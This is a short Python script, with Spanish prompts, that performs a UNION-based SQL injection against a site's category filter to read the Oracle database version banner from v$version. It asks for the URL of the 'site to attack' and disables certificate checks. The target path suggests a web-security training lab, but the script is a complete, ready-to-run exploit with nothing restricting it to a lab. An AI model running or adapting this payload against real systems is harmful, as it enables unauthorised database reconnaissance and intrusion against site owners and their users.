import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli_version(url):
    path="filter?category=Lifestyle"
    sql_payload ="' UNION SELECT banner, NULL FROM v$version-- - "

    r = requests.get(url + path + sql_payload, verify=False)
    res = r.text
    if "Oracle Database" in res:
        print("[+] Se ha encontrado la version de la base de datos:\n")
        soup = BeautifulSoup(res,'html.parser')

        version = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
        
        print("[+] La versión de la base de datos Oracle es:\n\n" + version)

if __name__ == "__main__":
    print("\nIngrese la URL base del sitio a atacar: ", end="")
    url = input()
    print("[+] Obteniendo la version de la base de datos...\n")
    exploit_sqli_version(url)
        
